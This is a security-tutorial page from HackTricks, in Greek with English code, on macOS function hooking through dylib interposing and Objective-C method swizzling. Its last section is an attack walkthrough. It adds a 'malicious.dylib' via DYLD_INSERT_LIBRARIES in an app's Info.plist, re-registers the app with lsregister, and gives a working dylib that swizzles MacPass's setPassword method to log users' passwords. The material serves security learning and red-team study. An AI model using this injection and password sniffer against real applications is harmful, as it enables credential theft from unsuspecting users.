# macOS Function Hooking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Function Interposing

Δημιουργήστε ένα **dylib** με μια ενότητα **`__interpose`** (ή μια ενότητα με σημαία **`S_INTERPOSING`**) που περιέχει ζεύγη **δείκτες συναρτήσεων** που αναφέρονται στις **αρχικές** και **αντικαταστάσιμες** συναρτήσεις.

Στη συνέχεια, **εισάγετε** το dylib με **`DYLD_INSERT_LIBRARIES`** (η διαμεσολάβηση πρέπει να συμβαίνει πριν φορτωθεί η κύρια εφαρμογή). Προφανώς, οι [**περιορισμοί** που εφαρμόζονται στη χρήση του **`DYLD_INSERT_LIBRARIES`** ισχύουν και εδώ](../macos-proces-abuse/macos-library-injection/#check-restrictions).&#x20;

### Interpose printf

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="hello.c" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %}
```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endtab %}
{% endtabs %}
```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```
## Μέθοδος Swizzling

Στην ObjectiveC, έτσι καλείται μια μέθοδος: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

Απαιτείται το **αντικείμενο**, η **μέθοδος** και οι **παράμετροι**. Και όταν καλείται μια μέθοδος, ένα **msg αποστέλλεται** χρησιμοποιώντας τη συνάρτηση **`objc_msgSend`**: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Το αντικείμενο είναι **`someObject`**, η μέθοδος είναι **`@selector(method1p1:p2:)`** και τα επιχειρήματα είναι **value1**, **value2**.

Ακολουθώντας τις δομές αντικειμένων, είναι δυνατή η πρόσβαση σε ένα **πίνακα μεθόδων** όπου οι **ονομασίες** και οι **δείκτες** στον κώδικα της μεθόδου είναι **τοποθετημένοι**.

{% hint style="danger" %}
Σημειώστε ότι επειδή οι μέθοδοι και οι κλάσεις προσπελάζονται με βάση τα ονόματά τους, αυτές οι πληροφορίες αποθηκεύονται στο δυαδικό αρχείο, επομένως είναι δυνατή η ανάκτησή τους με `otool -ov </path/bin>` ή [`class-dump </path/bin>`](https://github.com/nygard/class-dump)
{% endhint %}

### Πρόσβαση στις ακατέργαστες μεθόδους

Είναι δυνατή η πρόσβαση στις πληροφορίες των μεθόδων όπως το όνομα, ο αριθμός παραμέτρων ή η διεύθυνση όπως στο παρακάτω παράδειγμα:
```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```
### Μέθοδος Swizzling με method\_exchangeImplementations

Η συνάρτηση **`method_exchangeImplementations`** επιτρέπει να **αλλάξει** η **διεύθυνση** της **υλοποίησης** **μιας συνάρτησης με την άλλη**.

{% hint style="danger" %}
Έτσι, όταν καλείται μια συνάρτηση, αυτό που **εκτελείται είναι η άλλη**.
{% endhint %}
```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```
{% hint style="warning" %}
Σε αυτή την περίπτωση, αν ο **κωδικός υλοποίησης της νόμιμης** μεθόδου **επαληθεύει** το **όνομα** της **μεθόδου**, θα μπορούσε να **ανιχνεύσει** αυτή τη swizzling και να την αποτρέψει από το να εκτελεστεί.

Η παρακάτω τεχνική δεν έχει αυτόν τον περιορισμό.
{% endhint %}

### Method Swizzling με method\_setImplementation

Η προηγούμενη μορφή είναι περίεργη γιατί αλλάζετε την υλοποίηση 2 μεθόδων η μία με την άλλη. Χρησιμοποιώντας τη συνάρτηση **`method_setImplementation`** μπορείτε να **αλλάξετε** την **υλοποίηση** μιας **μεθόδου με την άλλη**.

Απλά θυμηθείτε να **αποθηκεύσετε τη διεύθυνση της υλοποίησης της αρχικής** αν σκοπεύετε να την καλέσετε από τη νέα υλοποίηση πριν την αντικαταστήσετε, γιατί αργότερα θα είναι πολύ πιο περίπλοκο να εντοπίσετε αυτή τη διεύθυνση.
```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```
## Hooking Attack Methodology

Σε αυτή τη σελίδα συζητήθηκαν διάφοροι τρόποι για να συνδεθούν οι συναρτήσεις. Ωστόσο, περιλάμβαναν **την εκτέλεση κώδικα μέσα στη διαδικασία για επίθεση**.

Για να το κάνετε αυτό, η πιο εύκολη τεχνική που μπορείτε να χρησιμοποιήσετε είναι να εισάγετε ένα [Dyld μέσω μεταβλητών περιβάλλοντος ή hijacking](../macos-dyld-hijacking-and-dyld\_insert\_libraries.md). Ωστόσο, υποθέτω ότι αυτό θα μπορούσε επίσης να γίνει μέσω [Dylib process injection](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port).

Ωστόσο, και οι δύο επιλογές είναι **περιορισμένες** σε **μη προστατευμένα** δυαδικά/διαδικασίες. Ελέγξτε κάθε τεχνική για να μάθετε περισσότερα σχετικά με τους περιορισμούς.

Ωστόσο, μια επίθεση hooking function είναι πολύ συγκεκριμένη, ένας επιτιθέμενος θα το κάνει αυτό για να **κλέψει ευαίσθητες πληροφορίες από μέσα σε μια διαδικασία** (αν όχι, θα κάνατε απλώς μια επίθεση εισαγωγής διαδικασίας). Και αυτές οι ευαίσθητες πληροφορίες μπορεί να βρίσκονται σε εφαρμογές που έχει κατεβάσει ο χρήστης, όπως το MacPass.

Έτσι, το vector του επιτιθέμενου θα ήταν είτε να βρει μια ευπάθεια είτε να αφαιρέσει την υπογραφή της εφαρμογής, εισάγοντας τη μεταβλητή περιβάλλοντος **`DYLD_INSERT_LIBRARIES`** μέσω του Info.plist της εφαρμογής προσθέτοντας κάτι όπως:
```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```
και στη συνέχεια **επανακαταχωρήστε** την εφαρμογή:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Προσθέστε σε αυτή τη βιβλιοθήκη τον κώδικα hooking για να εξάγετε τις πληροφορίες: Κωδικοί πρόσβασης, μηνύματα...

{% hint style="danger" %}
Σημειώστε ότι σε νεότερες εκδόσεις του macOS, αν **αφαιρέσετε την υπογραφή** του δυαδικού αρχείου της εφαρμογής και είχε εκτελεστεί προηγουμένως, το macOS **δεν θα εκτελεί την εφαρμογή** πια.
{% endhint %}

#### Παράδειγμα βιβλιοθήκης
```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```
## Αναφορές

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
